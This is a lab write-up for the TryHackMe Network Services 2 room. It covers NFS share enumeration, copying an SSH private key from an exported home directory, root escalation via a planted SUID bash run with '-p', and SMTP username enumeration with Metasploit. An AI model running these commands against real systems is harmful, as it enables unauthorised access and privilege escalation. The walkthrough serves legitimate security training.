# Network Services 2 — TryHackMe

Note: All target IP addresses in this write-up are shown as `<IP_ADDRESS>`, because the lab target IP changes between sessions.

## 1. NFS

NFS stands for Network File System. It is a system that allows files on a remote machine to be accessed as if they were local files. With NFS, files can be shared with other machines on the same network.

The NFS step from this lab is recorded in Section 3.

## 2. Enumeration

Enumeration is the systematic gathering of detailed information about a target, such as its services, shares, users, and permissions. It is the information-gathering phase that comes before exploitation: the attacker is preparing to attack, but is not launching an exploit yet.

This phase is important because it is the final discovery step before getting into a machine. Its findings determine which entry point or exploit is worth trying next, so a missed finding here can mean a missed way in.

## 3. NFS Enumeration and Mounting

### Full Port Scan

I scanned all ports and listed only the open ones:

```bash
nmap -p- --open <IP_ADDRESS>
```

Seven open ports were found:

```text
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
2049/tcp  open  nfs
38241/tcp open  unknown
38869/tcp open  unknown
43943/tcp open  unknown
56205/tcp open  unknown
```

Port `2049/tcp` was the target port here, because it is the NFS service.

### Finding the NFS Export with showmount

I used `showmount` to list the NFS shares exported by the target:

```bash
/usr/sbin/showmount -e <IP_ADDRESS>
```

```text
Export list for <IP_ADDRESS>:
/home *
```

This showed that the `/home` directory was exported, and the `*` means it was available to any host, rather than restricted to a specific client.

### Mounting the NFS Share

I mounted the exported `/home` directory to `/tmp/mount` on my machine:

```bash
sudo mount -t nfs <IP_ADDRESS>:/home /tmp/mount -o nolock
```

### Listing the Mounted Share

Listing the mounted directory returned:

```text
total 12
drwxr-xr-x  4 root root 4096 Jun 22  2025 .
drwxrwxrwt 13 root root  280 Oct 31 17:57 ..
drwxr-xr-x  5 tian tian 4096 Jun 22  2025 cappucino
drwxr-xr-x  4 1001 1002 4096 Jun 22  2025 ubuntu
```

The mounted share contained two user-like directories, `cappucino` and `ubuntu`. Their hidden contents are recorded in Section 4.

## 4. Hidden Files in the Mounted Home Directories

A normal listing does not show hidden files, so I used `ls -la` inside both mounted home directories to reveal dotfiles and dot-directories.

### cappucino

```text
total 36
drwxr-xr-x 5 tian tian 4096 Jun 22  2025 .
drwxr-xr-x 4 root root 4096 Jun 22  2025 ..
-rw-r--r-- 1 tian tian  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tian tian 3771 Apr  4  2018 .bashrc
drwx------ 2 tian tian 4096 Apr 22  2020 .cache
drwx------ 3 tian tian 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 tian tian  807 Apr  4  2018 .profile
drwx------ 2 tian tian 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 tian tian    0 Apr 22  2020 .sudo_as_admin_successful
-rw------- 1 root root  766 Jun 21  2025 .viminfo
```

### ubuntu

```text
total 28
drwxr-xr-x 4 1001 1002 4096 Jun 22  2025 .
drwxr-xr-x 4 root root 4096 Jun 22  2025 ..
-rw-r--r-- 1 1001 1002  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 1001 1002 3771 Apr  4  2018 .bashrc
drwx------ 2 1001 1002 4096 Jun 22  2025 .cache
-rw-r--r-- 1 1001 1002  807 Apr  4  2018 .profile
drwx------ 2 1001 1002 4096 Jun 22  2025 .ssh
-rw-r--r-- 1 1001 1002    0 Jun 22  2025 .sudo_as_admin_successful
```

The `.ssh` directory in `cappucino` stood out as the most interesting place to keep digging, because SSH directories can contain key material.

### Finding id_rsa in cappucino/.ssh

Inside `/tmp/mount/cappucino/.ssh`, I found:

```text
authorized_keys  id_rsa  id_rsa.pub
```

I copied `id_rsa` to a local working directory on my own machine and restricted access to the key; OpenSSH rejects private keys that are accessible to other users:

```bash
cp id_rsa <local working directory>
chmod 600 id_rsa
```

I then viewed the copied file locally and confirmed it was an RSA private key. The private key content itself is intentionally not reproduced in this write-up.

## 5. SSH Login as cappucino and Privilege Escalation via SUID Bash

### Downloading the Target's Bash Executable

I used `scp` with the recovered SSH private key to download the target's own `/bin/bash` executable to Kali. This avoids potential binary compatibility issues (for example, my Kali VM uses ARM64, while the target provides its own compatible Linux executable).

```bash
scp -i /home/tian/Documents/network_services/id_rsa cappucino@<IP_ADDRESS>:/bin/bash /home/tian/Downloads/bash
```

`scp` transfers the binary; it does **not** provide an interactive shell. The destination is a **file path**, not a new folder. Since my Kali terminal was running as root, I used `/home/tian/Downloads/bash` instead of `~/Downloads/bash` to avoid resolving `~` to `/root`.

### Copying Bash into the Mounted NFS Share

At this stage, the downloaded executable existed on **Kali**, not in the target user's home directory. After confirming that the NFS share was still mounted at `/tmp/mount`, I copied it to the exported home directory:

```bash
findmnt /tmp/mount
ls -la /tmp/mount/cappucino/
cp /home/tian/Downloads/bash /tmp/mount/cappucino/bash
```

The NFS path `/tmp/mount/cappucino/bash` on Kali corresponds to `/home/cappucino/bash` on the target. A regular `cp` does not guarantee preservation of special permission bits.

### Root Ownership and SUID

The lab uses a root-owned Bash executable with the SUID bit set. The relevant commands are:

```bash
sudo chown root:root /tmp/mount/cappucino/bash
sudo chmod u+s /tmp/mount/cappucino/bash
ls -l /tmp/mount/cappucino/bash
```

Here, `chown` sets the file's owner and group; `chmod u+s` sets **SUID** for the file owner. `chmod +s` can also set **SGID**, which is not necessary for this technique. The actual permissions observed on the target were `-rwsr-sr-x`, so both bits were present in this lab.

The successful outcome depends on the NFS server's configuration. For example, `root_squash` can map remote root requests to an unprivileged identity, preventing the ownership change; `nosuid` on the execution filesystem can prevent the SUID bit from taking effect. This is a lab-specific misconfiguration, not a universal property of NFS.

### Logging in as cappucino

I then logged in over SSH with the same private key:

```bash
ssh -i id_rsa cappucino@<IP_ADDRESS>
```

```text
cappucino@target:~$ whoami
cappucino
```

### Running the SUID Bash

In cappucino's home directory, I confirmed the `bash` binary and its permissions:

```text
cappucino@target:~$ ls
bash
cappucino@target:~$ ls -la bash
-rwsr-sr-x 1 root root 1183448 Nov  1 22:19 bash
```

The owner execute-position `s` and root ownership show that SUID was enabled on this root-owned Bash. The group execute-position `s` also indicates SGID; it was present in the observed result but not required for root effective UID. I ran it with `-p`, which tells Bash not to drop its effective privileges on startup:

```bash
./bash -p
```

```text
bash-5.0# ls
bash
bash-5.0# pwd
/home/cappucino
bash-5.0# whoami
root
```

The SUID bit caused Bash to start with an effective user ID of root, and `-p` preserved that effective identity rather than dropping it. The observed `whoami` output confirmed the resulting privileged shell. The original SSH login remained the unprivileged `cappucino` account.

### Reading the NFS Flag

From the root shell, I moved to root's home directory and read the flag file:

```text
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
```

That file contained the NFS flag. The flag value is intentionally omitted from this write-up.

## 6. SMTP Enumeration

### Port Scan for SMTP

I scanned the target with Nmap and found two open ports:

```bash
nmap <IP_ADDRESS>
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
```

Port `25/tcp` was the SMTP service to enumerate next.

### SMTP Version Enumeration with Metasploit

In Metasploit, I used the SMTP version scanner:

```text
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <IP_ADDRESS>
run
```

It returned the mail server banner, identifying the mail name and the mail transfer agent (MTA):

```text
<IP_ADDRESS>:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)
```

This confirmed the SMTP server was Postfix on Ubuntu, hosted at `polosmtp.home`.

### User Enumeration with smtp_enum

With that information, I used the SMTP user enumeration module:

```text
use auxiliary/scanner/smtp/smtp_enum
set USER_FILE /usr/share/wordlists/SecLists-master/Usernames/top-usernames-shortlist.txt
set RHOSTS <IP_ADDRESS>
run
```

The module used the same banner and found one username:

```text
[*] <IP_ADDRESS>:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] <IP_ADDRESS>:25 Users found: administrator
[*] <IP_ADDRESS>:25 Scanned 1 of 1 hosts (100% complete)
```

### Finding

Enumerating SMTP gave two concrete facts for the next stage: the server is Postfix (Ubuntu) at `polosmtp.home`, and a valid username, `administrator`, exists on that mail service. No password or further access is recorded here yet.
